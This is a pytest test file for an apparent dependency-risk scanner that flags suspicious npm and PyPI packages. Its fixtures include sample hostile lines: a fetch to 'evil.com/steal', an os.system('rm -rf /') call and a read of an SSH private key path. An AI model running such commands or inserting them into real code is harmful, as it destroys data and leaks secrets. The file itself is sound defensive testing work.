"""Unit tests for individual depshield modules.

Covers the JS analyzer, Python analyzer, metadata analyzer, scorer
and report generator. All tests run offline using temp files or
synthetic data.
"""

import json
import textwrap
from pathlib import Path

import pytest

from depshield.analyzers.js_analyzer import (
    Finding,
    analyze_file as js_analyze_file,
    analyze_directory as js_analyze_dir,
)
from depshield.analyzers.py_analyzer import (
    analyze_file as py_analyze_file,
    analyze_directory as py_analyze_dir,
)
from depshield.analyzers.metadata_analyzer import (
    analyze_metadata,
    _levenshtein,
)
from depshield.scoring.scorer import (
    score_package,
    score_all,
    PackageScore,
    _classify,
)
from depshield.scoring.report import to_json, save_json, print_report


# --- JavaScript Analyzer ---


class TestJsAnalyzer:
    """Tests para el análisis estático de JavaScript."""

    def test_detect_eval(self, tmp_path):
        """eval() se detecta como CODE_EXECUTION con severidad HIGH."""
        js_file = tmp_path / "malicious.js"
        js_file.write_text("var x = eval('alert(1)');\n", encoding="utf-8")
        findings = js_analyze_file(str(js_file))
        code_exec = [f for f in findings if f.signal_type == "CODE_EXECUTION"]
        assert len(code_exec) >= 1
        assert code_exec[0].severity == "HIGH"

    def test_detect_network_fetch(self, tmp_path):
        """fetch() se detecta como NETWORK_CALLS."""
        js_file = tmp_path / "net.js"
        js_file.write_text("fetch('https://evil.com/steal');\n", encoding="utf-8")
        findings = js_analyze_file(str(js_file))
        net = [f for f in findings if f.signal_type == "NETWORK_CALLS"]
        assert len(net) >= 1

    def test_detect_env_access(self, tmp_path):
        """process.env se detecta como ENV_ACCESS."""
        js_file = tmp_path / "env.js"
        js_file.write_text("var secret = process.env.API_KEY;\n", encoding="utf-8")
        findings = js_analyze_file(str(js_file))
        env = [f for f in findings if f.signal_type == "ENV_ACCESS"]
        assert len(env) >= 1

    def test_clean_file_no_findings(self, tmp_path):
        """Un fichero JS limpio no produce findings."""
        js_file = tmp_path / "clean.js"
        js_file.write_text(
            "function add(a, b) { return a + b; }\nmodule.exports = add;\n",
            encoding="utf-8",
        )
        findings = js_analyze_file(str(js_file))
        # Un fichero limpio no debería tener findings HIGH
        high = [f for f in findings if f.severity == "HIGH"]
        assert len(high) == 0


# --- Python Analyzer ---


class TestPyAnalyzer:
    """Tests para el análisis estático de Python."""

    def test_detect_os_system(self, tmp_path):
        """os.system() se detecta como CODE_EXECUTION con severidad HIGH."""
        py_file = tmp_path / "hack.py"
        py_file.write_text("import os\nos.system('rm -rf /')\n", encoding="utf-8")
        findings = py_analyze_file(str(py_file))
        code_exec = [f for f in findings if f.signal_type == "CODE_EXECUTION"]
        assert len(code_exec) >= 1
        assert code_exec[0].severity == "HIGH"

    def test_detect_requests_import(self, tmp_path):
        """import requests se detecta como NETWORK_CALLS."""
        py_file = tmp_path / "net.py"
        py_file.write_text("import requests\nrequests.get('https://evil.com')\n", encoding="utf-8")
        findings = py_analyze_file(str(py_file))
        net = [f for f in findings if f.signal_type == "NETWORK_CALLS"]
        assert len(net) >= 1

    def test_detect_sensitive_path(self, tmp_path):
        """Referencias a ~/.ssh se detectan como FILE_SENSITIVE."""
        py_file = tmp_path / "steal.py"
        py_file.write_text('path = "/home/user/.ssh/id_rsa"\n', encoding="utf-8")
        findings = py_analyze_file(str(py_file))
        sensitive = [f for f in findings if f.signal_type == "FILE_SENSITIVE"]
        assert len(sensitive) >= 1
        assert sensitive[0].severity == "HIGH"

    def test_detect_base64_decode(self, tmp_path):
        """base64.b64decode() se detecta como OBFUSCATION."""
        py_file = tmp_path / "obfusc.py"
        py_file.write_text(
            "import base64\npayload = base64.b64decode('aGVsbG8=')\n",
            encoding="utf-8",
        )
        findings = py_analyze_file(str(py_file))
        obf = [f for f in findings if f.signal_type == "OBFUSCATION"]
        assert len(obf) >= 1


# --- Metadata Analyzer ---


class TestMetadataAnalyzer:
    """Tests para el análisis de metadatos de paquetes."""

    def test_detect_no_repository(self):
        """Un paquete sin repositorio genera finding NO_REPOSITORY."""
        meta = {
            "ecosystem": "npm",
            "repository": "",
            "homepage": "",
            "license": "MIT",
            "description": "A normal package",
            "maintainers": ["alice", "bob"],
        }
        findings = analyze_metadata(meta, "test-pkg")
        no_repo = [f for f in findings if f.signal_type == "NO_REPOSITORY"]
        assert len(no_repo) == 1
        assert no_repo[0].severity == "MEDIUM"

    def test_detect_typosquatting(self):
        """Un nombre similar a un paquete popular genera TYPOSQUATTING."""
        meta = {"ecosystem": "npm"}
        # "lodasj" tiene distancia 1 de "lodash"
        findings = analyze_metadata(meta, "lodasj")
        typo = [f for f in findings if f.signal_type == "TYPOSQUATTING"]
        assert len(typo) >= 1
        assert typo[0].severity == "HIGH"
        assert "lodash" in typo[0].snippet

    def test_levenshtein_distance(self):
        """La función de distancia Levenshtein calcula correctamente."""
        assert _levenshtein("lodash", "lodash") == 0
        assert _levenshtein("lodash", "lodasj") == 1
        assert _levenshtein("lodash", "lodasjx") == 2
        assert _levenshtein("", "abc") == 3
        assert _levenshtein("kitten", "sitting") == 3

    def test_detect_no_license_and_short_description(self):
        """Paquete sin licencia y sin descripción genera múltiples findings."""
        meta = {
            "ecosystem": "pypi",
            "license": "",
            "description": "",
            "repository": "https://github.com/test/test",
            "maintainers": ["alice", "bob"],
        }
        findings = analyze_metadata(meta, "test-pkg")
        types = {f.signal_type for f in findings}
        assert "NO_LICENSE" in types
        assert "DESCRIPTION_MISMATCH" in types


# --- Scorer ---


class TestScorer:
    """Tests para el sistema de scoring y clasificación de riesgos."""

    def test_classify_boundaries(self):
        """Los límites de clasificación son correctos."""
        assert _classify(0) == "SAFE"
        assert _classify(10) == "SAFE"
        assert _classify(11) == "LOW_RISK"
        assert _classify(30) == "LOW_RISK"
        assert _classify(31) == "MEDIUM_RISK"
        assert _classify(60) == "MEDIUM_RISK"
        assert _classify(61) == "HIGH_RISK"
        assert _classify(100) == "HIGH_RISK"

    def test_score_caps_at_100(self):
        """El score nunca supera 100 aunque haya muchos findings."""
        findings = [
            Finding("CODE_EXECUTION", "HIGH", f"file_{i}.js", 1, "eval(x)")
            for i in range(10)  # 10 × 25 = 250 → capeado a 100
        ]
        result = score_package("evilpkg", "1.0.0", findings)
        assert result.score == 100
        assert result.classification == "HIGH_RISK"

    def test_score_no_findings_is_safe(self):
        """Un paquete sin findings tiene score 0 y clasificación SAFE."""
        result = score_package("clean-pkg", "1.0.0", [])
        assert result.score == 0
        assert result.classification == "SAFE"
        assert result.findings == []

    def test_score_all_sorts_correctly(self):
        """score_all ordena: directos primero, luego por score descendente."""
        packages = [
            ("safe-trans", "1.0", [], False),       # transitive, score=0
            ("risky-direct", "1.0", [
                Finding("CODE_EXECUTION", "HIGH", "x.js", 1, "eval(x)"),
            ], True),                                 # direct, score=25
            ("safe-direct", "1.0", [], True),         # direct, score=0
        ]
        results = score_all(packages)
        # Direct deps first (sorted by score desc), then transitive
        assert results[0].name == "risky-direct"   # direct, score=25
        assert results[1].name == "safe-direct"     # direct, score=0
        assert results[2].name == "safe-trans"      # transitive, score=0


# --- Report ---


class TestReport:
    """Tests para la generación de informes."""

    def _make_scores(self) -> list[PackageScore]:
        """Helper: crea una lista de PackageScores de ejemplo."""
        return [
            PackageScore(
                name="evil-pkg", version="1.0.0", score=75,
                classification="HIGH_RISK",
                findings=[
                    Finding("CODE_EXECUTION", "HIGH", "index.js", 1, "eval(x)"),
                    Finding("NETWORK_CALLS", "HIGH", "index.js", 2, "fetch(url)"),
                    Finding("TYPOSQUATTING", "HIGH", "metadata", 0, "Similar to express"),
                ],
                is_direct=True,
            ),
            PackageScore(
                name="safe-pkg", version="2.0.0", score=0,
                classification="SAFE", findings=[], is_direct=True,
            ),
        ]

    def test_to_json_structure(self):
        """to_json() genera la estructura correcta con summary y packages."""
        scores = self._make_scores()
        result = to_json(scores)
        assert result["summary"]["total_packages"] == 2
        assert result["summary"]["high_risk"] == 1
        assert result["summary"]["safe"] == 1
        assert len(result["packages"]) == 2

    def test_to_json_findings_serialized(self):
        """Cada finding se serializa con todos sus campos."""
        scores = self._make_scores()
        result = to_json(scores)
        evil = result["packages"][0]
        assert evil["name"] == "evil-pkg"
        assert len(evil["findings"]) == 3
        assert evil["findings"][0]["signal_type"] == "CODE_EXECUTION"
        assert evil["findings"][0]["severity"] == "HIGH"

    def test_save_json_creates_valid_file(self, tmp_path):
        """save_json() escribe un JSON válido y legible."""
        scores = self._make_scores()
        out = tmp_path / "report.json"
        save_json(scores, out)
        assert out.exists()
        data = json.loads(out.read_text(encoding="utf-8"))
        assert data["summary"]["total_packages"] == 2
        assert data["packages"][0]["score"] == 75

    def test_print_report_no_crash(self, capsys):
        """print_report() no lanza excepciones con datos válidos."""
        from rich.console import Console
        console = Console(file=None, quiet=True)
        scores = self._make_scores()
        # Should not raise
        print_report(scores, console=console)
        print_report([], console=console)  # Empty list
